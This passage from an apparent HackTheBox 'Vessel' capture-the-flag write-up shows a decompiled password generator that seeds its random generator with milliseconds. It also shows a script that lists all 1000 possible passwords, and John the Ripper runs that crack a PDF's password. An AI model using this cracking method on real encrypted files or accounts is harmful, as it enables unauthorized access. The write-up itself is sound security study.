<span id="cb25-86"><a href="#cb25-86" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.textBrowser_4.setHtml(QCoreApplication.translate(<span class="st">'MainWindow'</span>, <span class="st">'&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd"&gt;</span><span class="ch">\n</span><span class="st">&lt;html&gt;&lt;head&gt;&lt;meta name="qrichtext" content="1" /&gt;&lt;style type="text/css"&gt;</span><span class="ch">\n</span><span class="st">p, li { white-space: pre-wrap; }</span><span class="ch">\n</span><span class="st">&lt;/style&gt;&lt;/head&gt;&lt;body style=" font-family:</span><span class="ch">\'</span><span class="st">MS Shell Dlg 2</span><span class="ch">\'</span><span class="st">; font-size:8.25pt; font-weight:400; font-style:normal;"&gt;</span><span class="ch">\n</span><span class="st">&lt;p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"&gt;&lt;span style=" font-size:14pt;"&gt;Hide Password&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span>, <span class="va">None</span>))</span>
<span id="cb25-87"><a href="#cb25-87" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.checkBox.setText(<span class="st">''</span>)</span>
<span id="cb25-88"><a href="#cb25-88" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.comboBox.setItemText(<span class="dv">0</span>, QCoreApplication.translate(<span class="st">'MainWindow'</span>, <span class="st">'All Characters'</span>, <span class="va">None</span>))</span>
<span id="cb25-89"><a href="#cb25-89" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.comboBox.setItemText(<span class="dv">1</span>, QCoreApplication.translate(<span class="st">'MainWindow'</span>, <span class="st">'Alphabetic'</span>, <span class="va">None</span>))</span>
<span id="cb25-90"><a href="#cb25-90" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.comboBox.setItemText(<span class="dv">2</span>, QCoreApplication.translate(<span class="st">'MainWindow'</span>, <span class="st">'Alphanumeric'</span>, <span class="va">None</span>))</span>
<span id="cb25-91"><a href="#cb25-91" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.textBrowser_5.setDocumentTitle(<span class="st">''</span>)</span>
<span id="cb25-92"><a href="#cb25-92" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.textBrowser_5.setHtml(QCoreApplication.translate(<span class="st">'MainWindow'</span>, <span class="st">'&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd"&gt;</span><span class="ch">\n</span><span class="st">&lt;html&gt;&lt;head&gt;&lt;meta name="qrichtext" content="1" /&gt;&lt;style type="text/css"&gt;</span><span class="ch">\n</span><span class="st">p, li { white-space: pre-wrap; }</span><span class="ch">\n</span><span class="st">&lt;/style&gt;&lt;/head&gt;&lt;body style=" font-family:</span><span class="ch">\'</span><span class="st">MS Shell Dlg 2</span><span class="ch">\'</span><span class="st">; font-size:8.25pt; font-weight:400; font-style:normal;"&gt;</span><span class="ch">\n</span><span class="st">&lt;p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"&gt;&lt;span style=" font-size:16pt;"&gt;characters&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span>, <span class="va">None</span>))</span>
<span id="cb25-93"><a href="#cb25-93" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.password_field.setText(<span class="st">''</span>)</span>
<span id="cb25-94"><a href="#cb25-94" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-95"><a href="#cb25-95" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-96"><a href="#cb25-96" aria-hidden="true" tabindex="-1"></a><span class="kw">class</span> MainWindow(QMainWindow, Ui_MainWindow):</span>
<span id="cb25-97"><a href="#cb25-97" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-98"><a href="#cb25-98" aria-hidden="true" tabindex="-1"></a>    <span class="kw">def</span> <span class="fu">__init__</span>(<span class="va">self</span>):</span>
<span id="cb25-99"><a href="#cb25-99" aria-hidden="true" tabindex="-1"></a>        <span class="bu">super</span>(MainWindow, <span class="va">self</span>).<span class="fu">__init__</span>()</span>
<span id="cb25-100"><a href="#cb25-100" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.setupUi(<span class="va">self</span>)</span>
<span id="cb25-101"><a href="#cb25-101" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.setFixedSize(QSize(<span class="dv">550</span>, <span class="dv">400</span>))</span>
<span id="cb25-102"><a href="#cb25-102" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.setWindowTitle(<span class="st">'Secure Password Generator'</span>)</span>
<span id="cb25-103"><a href="#cb25-103" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.password_field.setReadOnly(<span class="va">True</span>)</span>
<span id="cb25-104"><a href="#cb25-104" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.passlen()</span>
<span id="cb25-105"><a href="#cb25-105" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.chars()</span>
<span id="cb25-106"><a href="#cb25-106" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.hide()</span>
<span id="cb25-107"><a href="#cb25-107" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.gen()</span>
<span id="cb25-108"><a href="#cb25-108" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-109"><a href="#cb25-109" aria-hidden="true" tabindex="-1"></a>    <span class="kw">def</span> passlen(<span class="va">self</span>):</span>
<span id="cb25-110"><a href="#cb25-110" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.PasswordLength.valueChanged.<span class="ex">connect</span>(<span class="va">self</span>.lenpass)</span>
<span id="cb25-111"><a href="#cb25-111" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-112"><a href="#cb25-112" aria-hidden="true" tabindex="-1"></a>    <span class="kw">def</span> lenpass(<span class="va">self</span>, l):</span>
<span id="cb25-113"><a href="#cb25-113" aria-hidden="true" tabindex="-1"></a>        <span class="kw">global</span> value</span>
<span id="cb25-114"><a href="#cb25-114" aria-hidden="true" tabindex="-1"></a>        value <span class="op">=</span> l</span>
<span id="cb25-115"><a href="#cb25-115" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-116"><a href="#cb25-116" aria-hidden="true" tabindex="-1"></a>    <span class="kw">def</span> chars(<span class="va">self</span>):</span>
<span id="cb25-117"><a href="#cb25-117" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.comboBox.currentIndexChanged.<span class="ex">connect</span>(<span class="va">self</span>.charss)</span>
<span id="cb25-118"><a href="#cb25-118" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-119"><a href="#cb25-119" aria-hidden="true" tabindex="-1"></a>    <span class="kw">def</span> charss(<span class="va">self</span>, i):</span>
<span id="cb25-120"><a href="#cb25-120" aria-hidden="true" tabindex="-1"></a>        <span class="kw">global</span> index</span>
<span id="cb25-121"><a href="#cb25-121" aria-hidden="true" tabindex="-1"></a>        index <span class="op">=</span> i</span>
<span id="cb25-122"><a href="#cb25-122" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-123"><a href="#cb25-123" aria-hidden="true" tabindex="-1"></a>    <span class="kw">def</span> hide(<span class="va">self</span>):</span>
<span id="cb25-124"><a href="#cb25-124" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.checkBox.stateChanged.<span class="ex">connect</span>(<span class="va">self</span>.status)</span>
<span id="cb25-125"><a href="#cb25-125" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-126"><a href="#cb25-126" aria-hidden="true" tabindex="-1"></a>    <span class="kw">def</span> status(<span class="va">self</span>, s):</span>
<span id="cb25-127"><a href="#cb25-127" aria-hidden="true" tabindex="-1"></a>        <span class="kw">global</span> status</span>
<span id="cb25-128"><a href="#cb25-128" aria-hidden="true" tabindex="-1"></a>        status <span class="op">=</span> s <span class="op">==</span> Qt.Checked</span>
<span id="cb25-129"><a href="#cb25-129" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-130"><a href="#cb25-130" aria-hidden="true" tabindex="-1"></a>    <span class="kw">def</span> copy(<span class="va">self</span>):</span>
<span id="cb25-131"><a href="#cb25-131" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.copyButton.clicked.<span class="ex">connect</span>(<span class="va">self</span>.copied)</span>
<span id="cb25-132"><a href="#cb25-132" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-133"><a href="#cb25-133" aria-hidden="true" tabindex="-1"></a>    <span class="kw">def</span> copied(<span class="va">self</span>):</span>
<span id="cb25-134"><a href="#cb25-134" aria-hidden="true" tabindex="-1"></a>        pyperclip.copy(<span class="va">self</span>.password_field.text())</span>
<span id="cb25-135"><a href="#cb25-135" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-136"><a href="#cb25-136" aria-hidden="true" tabindex="-1"></a>    <span class="kw">def</span> gen(<span class="va">self</span>):</span>
<span id="cb25-137"><a href="#cb25-137" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.generate.clicked.<span class="ex">connect</span>(<span class="va">self</span>.genButton)</span>
<span id="cb25-138"><a href="#cb25-138" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-139"><a href="#cb25-139" aria-hidden="true" tabindex="-1"></a>    <span class="kw">def</span> genButton(<span class="va">self</span>):</span>
<span id="cb25-140"><a href="#cb25-140" aria-hidden="true" tabindex="-1"></a>        <span class="cf">try</span>:</span>
<span id="cb25-141"><a href="#cb25-141" aria-hidden="true" tabindex="-1"></a>            hide <span class="op">=</span> status</span>
<span id="cb25-142"><a href="#cb25-142" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> hide:</span>
<span id="cb25-143"><a href="#cb25-143" aria-hidden="true" tabindex="-1"></a>                <span class="va">self</span>.password_field.setEchoMode(QLineEdit.Password)</span>
<span id="cb25-144"><a href="#cb25-144" aria-hidden="true" tabindex="-1"></a>            <span class="cf">else</span>:</span>
<span id="cb25-145"><a href="#cb25-145" aria-hidden="true" tabindex="-1"></a>                <span class="va">self</span>.password_field.setEchoMode(QLineEdit.Normal)</span>
<span id="cb25-146"><a href="#cb25-146" aria-hidden="true" tabindex="-1"></a>            password <span class="op">=</span> <span class="va">self</span>.genPassword()</span>
<span id="cb25-147"><a href="#cb25-147" aria-hidden="true" tabindex="-1"></a>            <span class="va">self</span>.password_field.setText(password)</span>
<span id="cb25-148"><a href="#cb25-148" aria-hidden="true" tabindex="-1"></a>        <span class="cf">except</span>:</span>
<span id="cb25-149"><a href="#cb25-149" aria-hidden="true" tabindex="-1"></a>            msg <span class="op">=</span> QMessageBox()</span>
<span id="cb25-150"><a href="#cb25-150" aria-hidden="true" tabindex="-1"></a>            msg.setWindowTitle(<span class="st">'Warning'</span>)</span>
<span id="cb25-151"><a href="#cb25-151" aria-hidden="true" tabindex="-1"></a>            msg.setText(<span class="st">'Change the default values before generating passwords!'</span>)</span>
<span id="cb25-152"><a href="#cb25-152" aria-hidden="true" tabindex="-1"></a>            x <span class="op">=</span> msg.exec_()</span>
<span id="cb25-153"><a href="#cb25-153" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-154"><a href="#cb25-154" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.copy()</span>
<span id="cb25-155"><a href="#cb25-155" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-156"><a href="#cb25-156" aria-hidden="true" tabindex="-1"></a>    <span class="kw">def</span> genPassword(<span class="va">self</span>):</span>
<span id="cb25-157"><a href="#cb25-157" aria-hidden="true" tabindex="-1"></a>        length <span class="op">=</span> value</span>
<span id="cb25-158"><a href="#cb25-158" aria-hidden="true" tabindex="-1"></a>        char <span class="op">=</span> index</span>
<span id="cb25-159"><a href="#cb25-159" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> char <span class="op">==</span> <span class="dv">0</span>:</span>
<span id="cb25-160"><a href="#cb25-160" aria-hidden="true" tabindex="-1"></a>            charset <span class="op">=</span> <span class="st">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+=</span><span class="sc">{}</span><span class="st">[]|:;&lt;&gt;,.?'</span></span>
<span id="cb25-161"><a href="#cb25-161" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span>:</span>
<span id="cb25-162"><a href="#cb25-162" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> char <span class="op">==</span> <span class="dv">1</span>:</span>
<span id="cb25-163"><a href="#cb25-163" aria-hidden="true" tabindex="-1"></a>                charset <span class="op">=</span> <span class="st">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span></span>
<span id="cb25-164"><a href="#cb25-164" aria-hidden="true" tabindex="-1"></a>            <span class="cf">else</span>:</span>
<span id="cb25-165"><a href="#cb25-165" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> char <span class="op">==</span> <span class="dv">2</span>:</span>
<span id="cb25-166"><a href="#cb25-166" aria-hidden="true" tabindex="-1"></a>                    charset <span class="op">=</span> <span class="st">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'</span></span>
<span id="cb25-167"><a href="#cb25-167" aria-hidden="true" tabindex="-1"></a>                <span class="cf">else</span>:</span>
<span id="cb25-168"><a href="#cb25-168" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">try</span>:</span>
<span id="cb25-169"><a href="#cb25-169" aria-hidden="true" tabindex="-1"></a>                        qsrand(QTime.currentTime().msec())</span>
<span id="cb25-170"><a href="#cb25-170" aria-hidden="true" tabindex="-1"></a>                        password <span class="op">=</span> <span class="st">''</span></span>
<span id="cb25-171"><a href="#cb25-171" aria-hidden="true" tabindex="-1"></a>                        <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(length):</span>
<span id="cb25-172"><a href="#cb25-172" aria-hidden="true" tabindex="-1"></a>                            idx <span class="op">=</span> qrand() <span class="op">%</span> <span class="bu">len</span>(charset)</span>
<span id="cb25-173"><a href="#cb25-173" aria-hidden="true" tabindex="-1"></a>                            nchar <span class="op">=</span> charset[idx]</span>
<span id="cb25-174"><a href="#cb25-174" aria-hidden="true" tabindex="-1"></a>                            password <span class="op">+=</span> <span class="bu">str</span>(nchar)</span>
<span id="cb25-175"><a href="#cb25-175" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-176"><a href="#cb25-176" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">except</span>:</span>
<span id="cb25-177"><a href="#cb25-177" aria-hidden="true" tabindex="-1"></a>                        msg <span class="op">=</span> QMessageBox()</span>
<span id="cb25-178"><a href="#cb25-178" aria-hidden="true" tabindex="-1"></a>                        msg.setWindowTitle(<span class="st">'Error'</span>)</span>
<span id="cb25-179"><a href="#cb25-179" aria-hidden="true" tabindex="-1"></a>                        msg.setText(<span class="st">'Error while generating password!, Send a message to the Author!'</span>)</span>
<span id="cb25-180"><a href="#cb25-180" aria-hidden="true" tabindex="-1"></a>                        x <span class="op">=</span> msg.exec_()</span>
<span id="cb25-181"><a href="#cb25-181" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-182"><a href="#cb25-182" aria-hidden="true" tabindex="-1"></a>                <span class="cf">return</span> password</span>
<span id="cb25-183"><a href="#cb25-183" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-184"><a href="#cb25-184" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-185"><a href="#cb25-185" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">'__main__'</span>:</span>
<span id="cb25-186"><a href="#cb25-186" aria-hidden="true" tabindex="-1"></a>    app <span class="op">=</span> QtWidgets.QApplication()</span>
<span id="cb25-187"><a href="#cb25-187" aria-hidden="true" tabindex="-1"></a>    mainwindow <span class="op">=</span> MainWindow()</span>
<span id="cb25-188"><a href="#cb25-188" aria-hidden="true" tabindex="-1"></a>    mainwindow.show()</span>
<span id="cb25-189"><a href="#cb25-189" aria-hidden="true" tabindex="-1"></a>    app.exec_()</span>
<span id="cb25-190"><a href="#cb25-190" aria-hidden="true" tabindex="-1"></a><span class="co"># okay decompiling passwordGenerator.pyc</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="step-6" class="level3">
<h3 class="anchored" data-anchor-id="step-6">Step 6</h3>
<p>At the bottom of the script we see the function we’re after, <code>genPassword</code>, where they use a simple for-loop and a time-based randomizer for generating passwords:</p>
<div class="sourceCode" id="cb26"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a> qsrand(QTime.currentTime().msec())</span>
<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a> password <span class="op">=</span> <span class="st">''</span></span>
<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a> <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(length):</span>
<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a>    idx <span class="op">=</span> qrand() <span class="op">%</span> <span class="bu">len</span>(charset)</span>
<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a>    nchar <span class="op">=</span> charset[idx]</span>
<span id="cb26-6"><a href="#cb26-6" aria-hidden="true" tabindex="-1"></a>    password <span class="op">+=</span> <span class="bu">str</span>(nchar)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>We can simply copy the <code>genPassword</code> function, remove all trash as we saw from <em>screenshot.png</em> that the length should be 32 and charset 0 (all characters) is used.</p>
<p>I was stuck with this script for a few hours, mainly because the product always generate 999 passwords. Debugging with <code>print()</code> and writing output to file I found that the value produced from <code>qrand()</code> isn’t that random at all and re-appear several times, even in the same pattern. Since the seed change every loop, my script would only generate 1 password per seed. Looking on the <a href="https://doc.qt.io/qtforpython-5/PySide2/QtCore/QTime.html#PySide2.QtCore.PySide2.QtCore.QTime.msec">docs</a> for <code>QTime.msec()</code> we find <code>msec()</code> will return 0 - 999, giving us a maximum of 1000 passwords generated.</p>
<p><strong>PoC to show qtime() “random” numbers:</strong></p>
<div class="sourceCode" id="cb27"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel ./genPw.py <span class="kw">|</span> <span class="fu">tee</span> output.txt </span>
<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a><span class="ex">loop</span> nr. 88434 <span class="at">-</span> generated passwords: 999</span>
<span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a><span class="ex">qrand:</span> 31376150</span>
<span id="cb27-5"><a href="#cb27-5" aria-hidden="true" tabindex="-1"></a><span class="ex">loop</span> nr. 88435 <span class="at">-</span> generated passwords: 999</span>
<span id="cb27-6"><a href="#cb27-6" aria-hidden="true" tabindex="-1"></a><span class="ex">qrand:</span> 31376150</span>
<span id="cb27-7"><a href="#cb27-7" aria-hidden="true" tabindex="-1"></a><span class="ex">loop</span> nr. 88436 <span class="at">-</span> generated passwords: 999</span>
<span id="cb27-8"><a href="#cb27-8" aria-hidden="true" tabindex="-1"></a><span class="ex">qrand:</span> 31424421</span>
<span id="cb27-9"><a href="#cb27-9" aria-hidden="true" tabindex="-1"></a><span class="ex">loop</span> nr. 88437 <span class="at">-</span> generated passwords: 999</span>
<span id="cb27-10"><a href="#cb27-10" aria-hidden="true" tabindex="-1"></a><span class="ex">qrand:</span> 31424421</span>
<span id="cb27-11"><a href="#cb27-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb27-12"><a href="#cb27-12" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel grep <span class="at">-n</span> 31376150 output.txt</span>
<span id="cb27-13"><a href="#cb27-13" aria-hidden="true" tabindex="-1"></a><span class="ex">59669:qrand:</span> 31376150</span>
<span id="cb27-14"><a href="#cb27-14" aria-hidden="true" tabindex="-1"></a><span class="ex">176871:qrand:</span> 31376150</span>
<span id="cb27-15"><a href="#cb27-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb27-16"><a href="#cb27-16" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel grep <span class="at">-n</span> 31424421 output.txt</span>
<span id="cb27-17"><a href="#cb27-17" aria-hidden="true" tabindex="-1"></a><span class="ex">59671:qrand:</span> 31424421</span>
<span id="cb27-18"><a href="#cb27-18" aria-hidden="true" tabindex="-1"></a><span class="ex">176873:qrand:</span> 31424421</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>We could also verify this a bit easier by just writing <code>QTime.currentTime().msec()</code> to a variable and printing the variable.</p>
<p>Write a script to loop through 0 - 999 and generate a password based on the “loop number” to generate all possible passwords. Most of the code can just be taken from the original program.</p>
<div class="sourceCode" id="cb28"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel python3 genPws.py</span>
<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a><span class="ex">loop</span> nr. 998 <span class="at">-</span> generated passwords: 997</span>
<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a><span class="ex">loop</span> nr. 999 <span class="at">-</span> generated passwords: 998</span>
<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a><span class="bu">time</span> elapsed: 0.02527642250061035 seconds</span>
<span id="cb28-6"><a href="#cb28-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb28-7"><a href="#cb28-7" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel wc <span class="at">-l</span> pw-list.txt </span>
<span id="cb28-8"><a href="#cb28-8" aria-hidden="true" tabindex="-1"></a><span class="ex">999</span> pw-list.txt</span>
<span id="cb28-9"><a href="#cb28-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb28-10"><a href="#cb28-10" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel john <span class="at">--wordlist</span><span class="op">=</span>pw-list.txt notes.hash </span>
<span id="cb28-11"><a href="#cb28-11" aria-hidden="true" tabindex="-1"></a><span class="ex">Using</span> default input encoding: UTF-8</span>
<span id="cb28-12"><a href="#cb28-12" aria-hidden="true" tabindex="-1"></a><span class="ex">Loaded</span> 1 password hash <span class="er">(</span><span class="ex">PDF</span> [MD5 SHA2 RC4/AES 32/64]<span class="kw">)</span></span>
<span id="cb28-13"><a href="#cb28-13" aria-hidden="true" tabindex="-1"></a><span class="ex">Cost</span> 1 <span class="er">(</span><span class="ex">revision</span><span class="kw">)</span> <span class="ex">is</span> 3 for all loaded hashes</span>
<span id="cb28-14"><a href="#cb28-14" aria-hidden="true" tabindex="-1"></a><span class="ex">Will</span> run 4 OpenMP threads</span>
<span id="cb28-15"><a href="#cb28-15" aria-hidden="true" tabindex="-1"></a><span class="ex">Press</span> <span class="st">'q'</span> or Ctrl-C to abort, almost any other key for status</span>
<span id="cb28-16"><a href="#cb28-16" aria-hidden="true" tabindex="-1"></a><span class="ex">0g</span> 0:00:00:00 DONE <span class="er">(</span><span class="ex">2022-09-01</span> 18:53<span class="kw">)</span> <span class="ex">0g/s</span> 99900p/s 99900c/s 99900C/s 2J16^<span class="op">&gt;</span>.<span class="kw">|</span><span class="va">vtXpN2</span><span class="op">[</span>o1H;e4f|FF0([y+|q..l2DoG^icl}&gt;kZ[tNB|:<span class="op">]</span><span class="ex">m5km@{x:^7ck</span></span>
<span id="cb28-17"><a href="#cb28-17" aria-hidden="true" tabindex="-1"></a><span class="ex">Session</span> completed. </span>
<span id="cb28-18"><a href="#cb28-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb28-19"><a href="#cb28-19" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel john <span class="at">--show</span> notes.hash</span>
<span id="cb28-20"><a href="#cb28-20" aria-hidden="true" tabindex="-1"></a><span class="ex">0</span> password hashes cracked, 1 left</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Although everything is correct in theory, we’re not able to generate correct password.. this had me stumped for even more hours where I re-built the script a few times but without any luck. Then I decided to try the script on my Windows VM.</p>
<div class="sourceCode" id="cb29"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="fu">PS</span> C<span class="op">:</span>\Users\void\Documents\htb\vessel<span class="op">&gt;</span> python3<span class="op">.</span><span class="dv">7.</span><span class="dt">exe</span> <span class="op">.</span>\genPws<span class="op">.</span><span class="fu">py</span></span>
<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a><span class="op">[...</span> snip <span class="op">...]</span></span>
<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a>loop nr<span class="op">.</span> <span class="dv">998</span> <span class="op">-</span> generated passwords<span class="op">:</span> <span class="dv">998</span></span>
<span id="cb29-4"><a href="#cb29-4" aria-hidden="true" tabindex="-1"></a><span class="dt">loop</span> nr<span class="op">.</span> <span class="dv">999</span> <span class="op">-</span> generated passwords<span class="op">:</span> <span class="dv">999</span></span>
<span id="cb29-5"><a href="#cb29-5" aria-hidden="true" tabindex="-1"></a><span class="dt">time</span> elapsed<span class="op">:</span> <span class="dv">0.14032745361328125</span> seconds</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Download my <strong>genPws.py</strong> script <a href="../../assets/scripts/vessel_genPws.py">HERE</a>.</p>
<p>Transfer the password file to Kali attack VM and BOOM! We’re able to crack the PDF. The problem is coming from <code>PySide2</code> behaving differently depending on OS. Don’t ask me how, or why, this I simply don’t know.</p>
<div class="sourceCode" id="cb30"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel john <span class="at">--wordlist</span><span class="op">=</span>pw-list_windows.txt notes.hash</span>
<span id="cb30-2"><a href="#cb30-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Using</span> default input encoding: UTF-8</span>
<span id="cb30-3"><a href="#cb30-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Loaded</span> 1 password hash <span class="er">(</span><span class="ex">PDF</span> [MD5 SHA2 RC4/AES 32/64]<span class="kw">)</span></span>
<span id="cb30-4"><a href="#cb30-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Cost</span> 1 <span class="er">(</span><span class="ex">revision</span><span class="kw">)</span> <span class="ex">is</span> 3 for all loaded hashes</span>
<span id="cb30-5"><a href="#cb30-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Will</span> run 4 OpenMP threads</span>
<span id="cb30-6"><a href="#cb30-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Press</span> <span class="st">'q'</span> or Ctrl-C to abort, almost any other key for status</span>
<span id="cb30-7"><a href="#cb30-7" aria-hidden="true" tabindex="-1"></a><span class="ex">YG7Q7RDzA+q</span><span class="kw">&amp;</span><span class="ex">ke~MJ8!yRzoI^VQxSqSS</span> <span class="er">(</span><span class="ex">notes.pdf</span><span class="kw">)</span>     </span>
<span id="cb30-8"><a href="#cb30-8" aria-hidden="true" tabindex="-1"></a><span class="ex">1g</span> 0:00:00:00 DONE <span class="er">(</span><span class="ex">2022-09-01</span> 19:01<span class="kw">)</span> <span class="ex">100.0g/s</span> 38400p/s 38400c/s 38400C/s _jEkA+f0VXtWZ[K.d+EdaBAB<span class="op">&gt;</span><span class="kw">;</span><span class="ex">r]E3Z*..r6TUgox@Tb5JWnK5AHO}</span><span class="va">$AE</span><span class="ex">%8!d58Shq</span></span>
<span id="cb30-9"><a href="#cb30-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Use</span> the <span class="st">"--show --format=PDF"</span> options to display all of the cracked passwords reliably</span>
<span id="cb30-10"><a href="#cb30-10" aria-hidden="true" tabindex="-1"></a><span class="ex">Session</span> completed. </span>
<span id="cb30-11"><a href="#cb30-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-12"><a href="#cb30-12" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel john <span class="at">--show</span> notes.hash                        </span>
<span id="cb30-13"><a href="#cb30-13" aria-hidden="true" tabindex="-1"></a><span class="ex">notes.pdf:YG7Q7RDzA+q</span><span class="kw">&amp;</span><span class="ex">ke~MJ8!yRzoI^VQxSqSS</span></span>
<span id="cb30-14"><a href="#cb30-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-15"><a href="#cb30-15" aria-hidden="true" tabindex="-1"></a><span class="ex">1</span> password hash cracked, 0 left</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="step-7" class="level3">
<h3 class="anchored" data-anchor-id="step-7">Step 7</h3>
